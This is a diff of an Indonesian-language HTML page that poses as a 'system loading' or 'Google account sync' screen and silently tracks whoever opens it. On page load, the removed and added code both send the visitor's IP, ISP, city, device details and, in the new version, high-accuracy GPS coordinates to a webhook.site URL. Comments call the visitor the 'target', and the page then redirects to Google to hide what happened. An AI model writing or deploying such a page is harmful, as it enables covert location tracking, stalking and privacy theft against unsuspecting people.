@@ -1,92 +1,57 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to Google Services...</title>
-    <style>
-        body { background: #111; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 14px; color: #aaa; }
-    </style>
+    <title>Sistem Sedang Memuat...</title>
+    <style>body{background:#000;color:#222;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
 </head>
 <body>
-
-<div class="container">
-    <div class="loader"></div>
-    <p>Sinkronisasi Akun Google...</p>
-</div>
+    <div style="border:2px solid #111;border-top:2px solid #333;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite"></div>
+    <style>@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
 
 <script>
     const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
 
-    async function ultraCapture() {
-        let batteryInfo = {};
-        
-        // Ambil info baterai (Buat tau target lagi lowbat atau nggak)
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryInfo = { level: b.level * 100 + "%", charging: b.charging };
-        }
+    async function sendLog(data) {
+        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+        navigator.sendBeacon(webhook, JSON.stringify(data));
+    }
 
-        try {
-            // 1. Ambil Data IP dan Lokasi Luas
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const d = await ipRes.json();
+    function capture() {
+        // Ambil data GPS (Akurasi Tinggi)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
 
-            // 2. Paket Data Kompleks
-            const log = {
-                title: "🚨 DATA_TARGET_DITERIMA",
-                timestamp: new Date().toLocaleString('id-ID'),
-                network: {
-                    ip: d.ip,
-                    isp: d.org,
-                    asn: d.asn
-                },
-                location: {
-                    city: d.city,
-                    region: d.region,
-                    country: d.country_name,
-                    zip: d.postal,
-                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
-                },
-                hardware: {
-                    device: navigator.userAgent,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    ram: navigator.deviceMemory || "Unknown",
-                    battery: batteryInfo,
-                    screen: `${window.screen.width}x${window.screen.height}`
-                },
-                browser: {
-                    name: navigator.appName,
-                    language: navigator.language,
-                    cookies_enabled: navigator.cookieEnabled
-                }
-            };
+                // Data lengkap dengan koordinat GPS asli
+                const report = {
+                    tipe: "GPS_PRESISI_TINGGI",
+                    maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                    akurasi_meter: acc,
+                    detail: `Koordinat: ${lat}, ${lon}`,
+                    device: navigator.userAgent
+                };
+                
+                await sendLog(report);
+                window.location.href = "https://www.google.com";
 
-            // 3. Kirim ke Webhook (Double Gate)
-            await fetch(webhook, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(log)
-            });
-            navigator.sendBeacon(webhook, JSON.stringify(log));
-
-        } catch (e) {
-            console.log("Bypass active");
-        } finally {
-            // 4. Pengalihan Akhir
-            // Gue lempar ke login Google palsu biar lu bisa liat reaksi target
-            setTimeout(() => {
-                window.location.href = "https://accounts.google.com/ServiceLogin";
-            }, 2000);
+            }, async (err) => {
+                // Jika target klik "TOLAK", ambil data IP sebagai cadangan
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const fallback = {
+                    tipe: "CADANGAN_IP_ONLY (Target Menolak GPS)",
+                    kota: d.city,
+                    maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                };
+                await sendLog(fallback);
+                window.location.href = "https://www.google.com";
+            }, { enableHighAccuracy: true });
         }
     }
 
-    window.onload = ultraCapture;
+    window.onload = capture;
 </script>
 </body>
 </html>
